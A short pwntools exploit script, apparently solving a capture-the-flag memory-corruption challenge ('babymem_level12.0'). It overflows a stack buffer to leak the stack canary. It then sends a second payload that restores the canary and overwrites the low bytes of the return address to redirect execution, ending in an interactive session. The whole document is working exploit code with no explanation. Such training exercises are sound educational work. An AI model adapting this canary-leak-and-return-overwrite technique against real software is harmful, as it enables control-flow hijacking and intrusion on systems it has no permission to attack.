from pwn import *
r = process('/challenge/babymem_level12.0')

r.sendline(b'500')
r.send(b'REPEAT\x41\x41' + b'a'*111 + b'c'*2)
r.recvuntil(b'aaaaaaac')
canary = u64(r.recv(8))-ord('c')
print(hex(canary))
r.sendline(b'500')
r.send(b'a'*0x78 + p64(canary) + b'a'*0x8 + b'\xcb\x24')






r.interactive()